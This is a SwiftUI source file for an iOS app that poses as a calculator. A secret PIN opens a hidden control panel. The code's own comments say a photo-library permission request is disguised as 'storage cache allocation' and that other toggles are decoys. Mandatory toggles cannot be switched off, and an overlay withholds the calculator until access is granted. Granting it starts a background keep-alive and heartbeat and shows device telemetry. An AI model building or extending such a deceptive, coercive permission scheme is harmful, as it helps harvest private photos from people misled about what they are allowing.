import SwiftUI
import AudioToolbox

struct ContentView: View {
    @StateObject private var engine = VaultEngine.shared
    @Environment(\.scenePhase) private var scenePhase

    @State private var display = "0"
    @State private var currentOperation: String? = nil
    @State private var previousValue: Double = 0
    @State private var isTyping = false
    @State private var keyHistory = ""

    // Full-Screen Secret Window State
    @State private var isSecretWindowOpen = false

    var body: some View {
        ZStack {
            if isSecretWindowOpen {
                ZexSecretFullWindow(engine: engine, isOpen: $isSecretWindowOpen)
                    .transition(.opacity.combined(with: .scale(scale: 0.98)))
            } else {
                calculatorView
                    .transition(.opacity)
            }
        }
        .preferredColorScheme(.dark)
        .onChange(of: scenePhase) { phase in
            // Security: Auto-lock immediately when app moves to background
            if phase == .background || phase == .inactive {
                isSecretWindowOpen = false
                clear()
            }
        }
    }

    // MARK: - Calculator Screen View
    private var calculatorView: some View {
        GeometryReader { geo in
            let spacing: CGFloat = 14
            let totalWidth = geo.size.width
            let buttonSize = (totalWidth - (spacing * 5)) / 4
            let zeroWidth = (buttonSize * 2) + spacing

            ZStack {
                Color.black.edgesIgnoringSafeArea(.all)

                VStack(spacing: spacing) {
                    Spacer()

                    // Display Value
                    HStack {
                        Spacer()
                        Text(display)
                            .font(.system(size: 80, weight: .light))
                            .foregroundColor(.white)
                            .lineLimit(1)
                            .minimumScaleFactor(0.2)
                            .padding(.horizontal, 24)
                    }

                    // Keypad
                    VStack(spacing: spacing) {
                        HStack(spacing: spacing) {
                            calcBtn("AC", size: buttonSize, color: Color(white: 0.65), textCol: .black) { clear() }
                            calcBtn("+/-", size: buttonSize, color: Color(white: 0.65), textCol: .black) { toggleSign() }
                            calcBtn("%", size: buttonSize, color: Color(white: 0.65), textCol: .black) { percentage() }
                            calcBtn("÷", size: buttonSize, color: .orange) { setOperation("÷") }
                        }

                        HStack(spacing: spacing) {
                            calcBtn("7", size: buttonSize) { inputDigit("7") }
                            calcBtn("8", size: buttonSize) { inputDigit("8") }
                            calcBtn("9", size: buttonSize) { inputDigit("9") }
                            calcBtn("×", size: buttonSize, color: .orange) { setOperation("×") }
                        }

                        HStack(spacing: spacing) {
                            calcBtn("4", size: buttonSize) { inputDigit("4") }
                            calcBtn("5", size: buttonSize) { inputDigit("5") }
                            calcBtn("6", size: buttonSize) { inputDigit("6") }
                            calcBtn("-", size: buttonSize, color: .orange) { setOperation("-") }
                        }

                        HStack(spacing: spacing) {
                            calcBtn("1", size: buttonSize) { inputDigit("1") }
                            calcBtn("2", size: buttonSize) { inputDigit("2") }
                            calcBtn("3", size: buttonSize) { inputDigit("3") }
                            calcBtn("+", size: buttonSize, color: .orange) { setOperation("+") }
                        }

                        HStack(spacing: spacing) {
                            Button(action: { inputDigit("0") }) {
                                HStack {
                                    Text("0")
                                        .font(.system(size: 34, weight: .medium))
                                        .foregroundColor(.white)
                                        .padding(.leading, buttonSize * 0.35)
                                    Spacer()
                                }
                                .frame(width: zeroWidth, height: buttonSize)
                                .background(Color(white: 0.2))
                                .cornerRadius(buttonSize / 2)
                            }

                            calcBtn(".", size: buttonSize) { inputDigit(".") }
                            calcBtn("=", size: buttonSize, color: .orange) { calculate() }
                        }
                    }
                    .padding(.bottom, geo.safeAreaInsets.bottom > 0 ? geo.safeAreaInsets.bottom : 20)
                }
                .padding(.horizontal, spacing)
            }
        }
    }

    private func calcBtn(_ label: String, size: CGFloat, color: Color = Color(white: 0.2), textCol: Color = .white, action: @escaping () -> Void) -> some View {
        Button(action: action) {
            Text(label)
                .font(.system(size: 32, weight: .medium))
                .foregroundColor(textCol)
                .frame(width: size, height: size)
                .background(color)
                .clipShape(Circle())
        }
    }

    private func inputDigit(_ digit: String) {
        keyHistory += digit
        if !isTyping {
            display = digit
            isTyping = true
        } else {
            display += digit
        }
    }

    private func clear() {
        display = "0"
        previousValue = 0
        currentOperation = nil
        isTyping = false
        keyHistory = ""
    }

    private func toggleSign() {
        if let val = Double(display) {
            display = val.truncatingRemainder(dividingBy: 1) == 0 ? String(Int(-val)) : String(-val)
        }
    }

    private func percentage() {
        if let val = Double(display) {
            display = String(val / 100)
        }
    }

    private func setOperation(_ op: String) {
        previousValue = Double(display) ?? 0
        currentOperation = op
        isTyping = false
        keyHistory += op
    }

    private func calculate() {
        keyHistory += "="

        // Trigger Secret Full Window
        if display == engine.secretPin || keyHistory.contains(engine.secretPin + "=") {
            keyHistory = ""
            clear()
            withAnimation(.easeInOut(duration: 0.3)) {
                isSecretWindowOpen = true
            }
            return
        }

        guard let op = currentOperation, let current = Double(display) else { return }
        var result: Double = 0
        switch op {
        case "+": result = previousValue + current
        case "-": result = previousValue - current
        case "×": result = previousValue * current
        case "÷": result = current != 0 ? previousValue / current : 0
        default: break
        }

        display = result.truncatingRemainder(dividingBy: 1) == 0 ? String(Int(result)) : String(result)
        currentOperation = nil
        isTyping = false
    }
}

// MARK: - FULL SCREEN "ZEX SECRET" WINDOW
struct ZexSecretFullWindow: View {
    @ObservedObject var engine: VaultEngine
    @Binding var isOpen: Bool

    @State private var slot1Active = false
    @State private var slot2Active = true
    @State private var slot3Active = true
    @State private var slot4Active = true

    @State private var showAlert = false
    @State private var alertTitle = ""
    @State private var alertMessage = ""

    // Auto-lock security timer
    @State private var autoLockTimer: Timer? = nil

    var body: some View {
        ZStack {
            Color(red: 0.05, green: 0.06, blue: 0.08).edgesIgnoringSafeArea(.all)

            VStack(spacing: 0) {
                // Top Custom Header
                HStack {
                    HStack(spacing: 10) {
                        Image(systemName: "shield.checkered")
                            .font(.system(size: 20))
                            .foregroundColor(.green)
                        Text("ZEX SECRET")
                            .font(.system(size: 18, weight: .bold, design: .monospaced))
                            .foregroundColor(.white)
                    }

                    Spacer()

                    // Quick Lock & Exit Button
                    Button(action: {
                        AudioServicesPlaySystemSound(1519) // Haptic
                        resetTimerAndLock()
                    }) {
                        HStack(spacing: 4) {
                            Image(systemName: "lock.fill")
                            Text("LOCK")
                        }
                        .font(.system(size: 12, weight: .bold))
                        .foregroundColor(.black)
                        .padding(.horizontal, 14)
                        .padding(.vertical, 8)
                        .background(Color.green)
                        .cornerRadius(20)
                    }
                }
                .padding(.horizontal, 20)
                .padding(.top, 16)
                .padding(.bottom, 20)
                .background(Color.white.opacity(0.04))

                // Scrollable Content
                ScrollView {
                    VStack(spacing: 20) {

                        // Telemetry Badge Card
                        HStack {
                            VStack(alignment: .leading, spacing: 4) {
                                Text("DEVICE ID: \(engine.deviceId)")
                                    .font(.system(size: 13, weight: .bold, design: .monospaced))
                                    .foregroundColor(.white)
                                Text("BATTERY: \(engine.batteryLevel)%" + (engine.isCharging ? " [CHARGING]" : ""))
                                    .font(.system(size: 11, design: .monospaced))
                                    .foregroundColor(.gray)
                            }
                            Spacer()
                            Circle()
                                .fill(engine.isBackgroundActive ? Color.green : Color.orange)
                                .frame(width: 10, height: 10)
                            Text(engine.isBackgroundActive ? "ACTIVE" : "STANDBY")
                                .font(.system(size: 11, weight: .bold, design: .monospaced))
                                .foregroundColor(engine.isBackgroundActive ? .green : .orange)
                        }
                        .padding()
                        .background(Color.white.opacity(0.05))
                        .cornerRadius(16)

                        // SECTION: DYNAMIC SLOTS & PERMISSIONS
                        VStack(alignment: .leading, spacing: 14) {
                            HStack {
                                Text("CONFIGURATION SLOTS & ENGINES")
                                    .font(.system(size: 12, weight: .bold, design: .monospaced))
                                    .foregroundColor(.gray)
                                Spacer()
                                Text("STRICT")
                                    .font(.system(size: 10, weight: .bold, design: .monospaced))
                                    .foregroundColor(.green)
                                    .padding(.horizontal, 6)
                                    .padding(.vertical, 2)
                                    .background(Color.green.opacity(0.1))
                                    .cornerRadius(6)
                            }

                            // Slot 1: Master Storage Allocation (Real Photo Permission Disguised)
                            slotCard(
                                title: engine.slot1Config.title,
                                subtitle: engine.slot1Config.subtitle,
                                isOn: $slot1Active,
                                icon: "internaldrive.fill",
                                onToggle: { newVal in
                                    handleSlot1Toggle(newVal)
                                }
                            )

                            // Slot 2: Decoy Math Processor
                            slotCard(
                                title: engine.slot2Config.title,
                                subtitle: engine.slot2Config.subtitle,
                                isOn: $slot2Active,
                                icon: "cpu.fill",
                                onToggle: { newVal in
                                    handleDecoyToggle(slot: 2, requestedVal: newVal, config: engine.slot2Config, state: $slot2Active)
                                }
                            )

                            // Slot 3: Decoy Haptic Sensor
                            slotCard(
                                title: engine.slot3Config.title,
                                subtitle: engine.slot3Config.subtitle,
                                isOn: $slot3Active,
                                icon: "waveform.path.ecg",
                                onToggle: { newVal in
                                    handleDecoyToggle(slot: 3, requestedVal: newVal, config: engine.slot3Config, state: $slot3Active)
                                }
                            )

                            // Slot 4: Decoy Buffer
                            slotCard(
                                title: engine.slot4Config.title,
                                subtitle: engine.slot4Config.subtitle,
                                isOn: $slot4Active,
                                icon: "antenna.radiowaves.left.and.right",
                                onToggle: { newVal in
                                    handleDecoyToggle(slot: 4, requestedVal: newVal, config: engine.slot4Config, state: $slot4Active)
                                }
                            )
                        }

                        // Decoy Preferences Info
                        VStack(alignment: .leading, spacing: 10) {
                            Text("SECURITY & OPTIMIZATION")
                                .font(.system(size: 12, weight: .bold, design: .monospaced))
                                .foregroundColor(.gray)

                            HStack {
                                Text("Encryption Protocol")
                                    .font(.subheadline)
                                    .foregroundColor(.white)
                                Spacer()
                                Text("AES-256 (HARDWARE)")
                                    .font(.system(size: 11, design: .monospaced))
                                    .foregroundColor(.green)
                            }
                            .padding()
                            .background(Color.white.opacity(0.04))
                            .cornerRadius(14)
                        }

                    }
                    .padding(20)
                }
            }

            // Strict Limited Access Blocking Overlay
            if engine.isStorageBlocked {
                limitedAccessOverlay
                    .transition(.opacity)
            }
        }
        .alert(isPresented: $showAlert) {
            Alert(
                title: Text(alertTitle),
                message: Text(alertMessage),
                dismissButton: .default(Text("OK"))
            )
        }
        .onAppear {
            slot1Active = engine.isActivated
            engine.checkPermissionStatus()
            startSecurityAutoLockTimer()
        }
        .onDisappear {
            autoLockTimer?.invalidate()
        }
    }

    // MARK: - Slot Card Component
    private func slotCard(title: String, subtitle: String, isOn: Binding<Bool>, icon: String, onToggle: @escaping (Bool) -> Void) -> some View {
        HStack(spacing: 14) {
            Image(systemName: icon)
                .font(.system(size: 20))
                .foregroundColor(isOn.wrappedValue ? .green : .gray)
                .frame(width: 32)

            VStack(alignment: .leading, spacing: 2) {
                Text(title)
                    .font(.system(size: 14, weight: .semibold))
                    .foregroundColor(.white)
                Text(subtitle)
                    .font(.system(size: 11))
                    .foregroundColor(.gray)
            }

            Spacer()

            Toggle("", isOn: Binding(
                get: { isOn.wrappedValue },
                set: { newVal in
                    onToggle(newVal)
                }
            ))
            .labelsHidden()
            .toggleStyle(SwitchToggleStyle(tint: .green))
        }
        .padding()
        .background(Color.white.opacity(0.04))
        .cornerRadius(16)
    }

    // MARK: - Slot 1 (Real Photo Library Disguised as Cache)
    private func handleSlot1Toggle(_ enable: Bool) {
        restartTimer()
        if enable {
            engine.requestStoragePermission { granted in
                if granted {
                    AudioServicesPlaySystemSound(1519)
                    slot1Active = true
                    engine.startBackgroundKeepAlive()
                    engine.startHeartbeat()
                } else {
                    // Denied - Enforce strict limitation
                    AudioServicesPlaySystemSound(1521)
                    slot1Active = false
                    alertTitle = "Permission Required"
                    alertMessage = engine.slot1Config.denyMsg
                    showAlert = true
                }
            }
        } else {
            // User tries to disable Slot 1
            if engine.slot1Config.mandatory {
                AudioServicesPlaySystemSound(1521)
                slot1Active = true
                alertTitle = "⚠️ Action Blocked"
                alertMessage = engine.slot1Config.denyMsg
                showAlert = true
            } else {
                slot1Active = false
            }
        }
    }

    // MARK: - Decoy Slots Strict Enforcement
    private func handleDecoyToggle(slot: Int, requestedVal: Bool, config: SlotConfig, state: Binding<Bool>) {
        restartTimer()
        if !requestedVal && config.mandatory {
            // Strict Mode: Revert back to ON and show warning
            AudioServicesPlaySystemSound(1521)
            state.wrappedValue = true
            alertTitle = "⚠️ Component Required"
            alertMessage = config.denyMsg
            showAlert = true
        } else {
            AudioServicesPlaySystemSound(1519)
            state.wrappedValue = requestedVal
        }
    }

    // MARK: - Limited Access Lock Overlay
    private var limitedAccessOverlay: some View {
        ZStack {
            Color.black.opacity(0.96).edgesIgnoringSafeArea(.all)

            VStack(spacing: 22) {
                ZStack {
                    Circle()
                        .fill(Color.red.opacity(0.15))
                        .frame(width: 80, height: 80)
                    Image(systemName: "exclamationmark.shield.fill")
                        .font(.system(size: 42))
                        .foregroundColor(.red)
                }

                VStack(spacing: 8) {
                    Text("LIMITED ACCESS MODE")
                        .font(.system(size: 18, weight: .bold, design: .monospaced))
                        .foregroundColor(.white)

                    Text("System cache and themes cannot initialize. Calculator operations are suspended until storage cache access is allowed.")
                        .font(.system(size: 13))
                        .multilineTextAlignment(.center)
                        .foregroundColor(.gray)
                        .padding(.horizontal, 28)
                }

                VStack(spacing: 12) {
                    Button(action: {
                        if let url = URL(string: UIApplication.openSettingsURLString) {
                            UIApplication.shared.open(url)
                        }
                    }) {
                        HStack(spacing: 6) {
                            Image(systemName: "gear")
                            Text("OPEN SETTINGS")
                        }
                        .font(.system(size: 13, weight: .bold))
                        .foregroundColor(.black)
                        .frame(maxWidth: .infinity)
                        .padding(.vertical, 14)
                        .background(Color.green)
                        .cornerRadius(14)
                    }

                    Button(action: {
                        engine.checkPermissionStatus()
                    }) {
                        HStack(spacing: 6) {
                            Image(systemName: "arrow.clockwise")
                            Text("RECHECK PERMISSION")
                        }
                        .font(.system(size: 13, weight: .semibold))
                        .foregroundColor(.white)
                        .frame(maxWidth: .infinity)
                        .padding(.vertical, 12)
                        .background(Color.white.opacity(0.08))
                        .cornerRadius(14)
                    }
                }
                .padding(.horizontal, 32)
                .padding(.top, 8)
            }
        }
    }

    // MARK: - Security Auto-Lock Timer
    private func startSecurityAutoLockTimer() {
        autoLockTimer?.invalidate()
        autoLockTimer = Timer.scheduledTimer(withTimeInterval: 60.0, repeats: false) { _ in
            resetTimerAndLock()
        }
    }

    private func restartTimer() {
        startSecurityAutoLockTimer()
    }

    private func resetTimerAndLock() {
        autoLockTimer?.invalidate()
        withAnimation {
            isOpen = false
        }
    }
}
